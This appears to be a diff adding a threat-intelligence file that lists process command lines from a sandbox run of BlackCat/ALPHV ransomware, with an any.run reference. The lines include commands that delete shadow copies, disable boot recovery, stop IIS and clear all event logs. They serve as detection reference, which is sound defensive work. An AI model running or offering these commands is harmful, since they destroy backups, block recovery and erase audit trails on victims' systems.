@@ -1,0 +1,16 @@
+BlackCat aka ALPHV Ransomware
+Referencia: https://app.any.run/tasks/eaaebf48-88eb-45d2-a743-936ecf244ae1/
+
+C:\Windows\asss1.exe --access-token cd29cb89daed9e2f3987e90d7ac97488241d3f87e21a574e3b465e15544e050c
+C:\Windows\system32\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}
+C:\Windows\system32\cmd.exe /c fsutil behavior set SymlinkEvaluation R2L:1
+C:\Windows\system32\cmd.exe /c fsutil behavior set SymlinkEvaluation R2R:1
+C:\Windows\system32\cmd.exe /c iisreset.exe /stop
+C:\Windows\system32\cmd.exe /c reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v MaxMpxCt /d 65535 /t REG_DWORD /f
+C:\Windows\system32\cmd.exe /c vssadmin.exe Delete Shadows /all /quiet
+C:\Windows\system32\cmd.exe /c arp -a
+C:\Windows\system32\cmd.exe /c wmic.exe Shadowcopy Delete
+C:\Windows\system32\cmd.exe /c bcdedit /set {default}
+C:\Windows\system32\cmd.exe /c bcdedit /set {default} recoveryenabled No
+C:\Windows\system32\cmd.exe /c cmd.exe /c  for /F \"tokens=*\" %1 in ('wevtutil.exe el') DO wevtutil.exe cl \"%1\"
+C:\Windows\system32\vssvc.exe
